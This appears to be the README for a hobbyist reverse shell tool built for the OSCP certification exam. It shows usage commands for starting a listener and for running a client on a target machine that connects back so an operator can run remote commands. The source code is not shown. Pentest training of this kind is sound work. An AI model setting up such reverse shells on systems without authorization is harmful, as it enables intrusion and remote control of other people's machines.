# Pachirisu-Script
This is a penetration testing tool for use with OSCP.

## Table of Contents
- [Introduction](#introduction)
- [Features](#features)
- [Usage](#usage)
- [Demo](#demo)
- [Supported OS](#supported-os)
- [Caveats](#caveats)
- [Todo](#todo)

## Introduction
This is a tool to be used instead of Meterpreter at OffSec Certified Professional (OSCP). Meterpreter can only be used once during an exam. However, the reverse shell using nc.exe is difficult to use. So I decided to create a reverse shell and receiver with some of the functionality of Meterpreter for my own use.

I like Pachirisu from Pokemon so I named my tool after it.

## Features
- Manage multiple shells from a single prompt.
- Works on both Windows and Linux.
- Easily switch between different connected clients.
- Simple command execution on remote systems.
- No need for additional tools beyond Python3.

## Usage

1. **Server Setup:**
   - Run the `server.py` script to start listening for incoming connections.
   - You can specify the IP and port to listen on as arguments. If not specified, it defaults to `0.0.0.0:9999`.
     ```sh
     python server.py [listen_ip] [listen_port]
     ```
   - Example:
     ```sh
     python server.py 0.0.0.0 9999
     ```

2. **Client Setup:**
   - Run the `client.py` script on the target machine to connect back to the server.
   - You can specify the target IP and port as arguments. If not specified, it defaults to `127.0.0.1:9999`.
     ```sh
     python client.py [target_ip] [target_port]
     ```
   - Example:
     ```sh
     python client.py 192.168.1.10 9999
     ```

3. **Interacting with Clients:**
   - Once a client is connected, you can select the client by its number from the list of active connections.
   - Enter commands to be executed on the selected remote machine.
   - To switch between different clients without disconnecting, use the `quit pachirisu` command to return to the client selection menu.


## Demo

## Supported OS
- Windows 11
- Linux
with Python3 installed.

## Caveats
- Ensure network connectivity between the server and clients.
- Proper firewall and network settings must be configured to allow for reverse shell connections.
- Use responsibly and only on systems you have permission to test.

## Todo
- Add encryption to the communication between server and client for enhanced security.
- Create a more user-friendly interface for managing multiple connections.
- Improve error handling and stability.
- Add logging of sessions and commands executed.
